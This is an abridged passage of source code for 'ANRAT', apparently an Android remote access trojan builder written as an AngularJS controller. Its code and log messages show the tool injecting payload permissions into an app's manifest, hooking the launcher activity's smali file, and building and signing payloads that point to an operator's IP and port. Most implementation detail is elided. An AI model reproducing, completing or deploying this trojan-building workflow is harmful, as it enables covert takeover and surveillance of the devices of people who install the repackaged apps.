...
app.controller("AppCtrl", ($scope) => {
    ...
    if (architecture === 'ia32') {
        delayedLog('[!] WARNING: ANRAT wWill Cease Support for All 32bit Systems Once Apktool reaches v3.0.0.', CONSTANTS.logStatus.WARNING);
    } else {
        delayedLog('[★] Welcome to ANRAT by superxeon', CONSTANTS.logStatus.SUCCESS);
    ...
    $appCtrl.modifyManifest = (data, callback) => {
        ...
        xml2js.parseString(data, {
            ...
            delayedLog('[★] Injecting ANRAT Payload Permissions...');
                        ...
                        xml2js.parseString(data, (err, result) => {
                            ...
                            const launcherPath = getLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                                ...
                                fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                                    ...
                                    delayedLog('[★] Injecting ANRAT Hook into the Main Class Smali File...');
    ...
    $appCtrl.Build = (ip, port) => {
        ...
        checkJavaVersion((error, javaVersion) => {
            if (error) {
                ...
                $appCtrl.Log('[¡] ANRAT Requires Java 11 to Decompile, Build and Sign Payloads.', CONSTANTS.logStatus.INFO);
                return;
